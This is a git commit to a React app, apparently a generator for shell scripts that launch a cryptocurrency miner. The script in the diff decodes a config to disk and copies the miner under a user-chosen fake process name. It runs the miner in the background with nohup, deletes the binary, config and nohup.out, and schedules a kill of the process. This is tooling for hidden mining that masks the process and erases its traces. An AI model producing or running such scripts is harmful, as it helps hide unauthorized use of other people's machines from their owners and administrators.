ee51d0c54211337e3b4c47fc3182b1e7ca80f190
Jerry <calljerryli@outlook.com>
2021-03-27 16:18:57 +0800

    feat: script generation feature completed

--- src/App.tsx
+++ src/App.tsx
@@ -1,7 +1,26 @@
-import React from 'react';
+import React, {useState} from 'react';
 import './App.css';
 
 function App() {
+    const [minerFilepath, setMinerFilepath] = useState('')
+    const [fakeProcessName, setFakeProcessName] = useState('')
+    const [config, setConfig] = useState('')
+    const [configFilename, setConfigFilename] = useState('')
+    const [killAt, setKillAt] = useState('')
+
+    const script = ` echo ${new Buffer(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 5 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`
+
+    const handleCopyScriptBtnClick = () => {
+        console.log('Copy script btn click, state:', {
+            minerFilepath,
+            fakeProcessName,
+            config,
+            configFilename,
+            killAt,
+            script,
+        })
+    }
+
     return (
         <div>
             <div
@@ -16,30 +35,48 @@ function App() {
                 <div className="window-body">
                     <div className="field-row-stacked">
                         <label>Miner filepath</label>
-                        <input type="text"/>
+                        <input
+                            type="text"
+                            onChange={e => setMinerFilepath(e.target.value)}
+                        />
                     </div>
                     <div className="field-row-stacked">
-                        <label>Fake name</label>
-                        <input type="text"/>
+                        <label>Fake process name</label>
+                        <input
+                            type="text"
+                            onChange={e => setFakeProcessName(e.target.value)}
+                        />
                     </div>
                     <div className="field-row-stacked">
                         <label>Config</label>
-                        <textarea rows={8}/>
+                        <textarea
+                            rows={10}
+                            onChange={e => setConfig(e.target.value)}
+                        />
                     </div>
                     <div className="field-row-stacked">
-                        <label>Config file name</label>
-                        <input type="text"/>
+                        <label>Config filename</label>
+                        <input
+                            type="text"
+                            onChange={e => setConfigFilename(e.target.value)}
+                        />
                     </div>
                     <div className="field-row-stacked">
                         <label>Kill at</label>
-                        <input type="text"/>
+                        <input
+                            type="text"
+                            onChange={e => setKillAt(e.target.value)}
+                        />
                     </div>
                     <div className="field-row-stacked">
                         <label>Script</label>
-                        <textarea rows={8}/>
+                        <textarea
+                            rows={8}
+                            defaultValue={script}
+                        />
                     </div>
                     <div className="field-row">
-                        <button>Copy</button>
+                        <button onClick={handleCopyScriptBtnClick}>Copy script</button>
                     </div>
                 </div>
             </div>
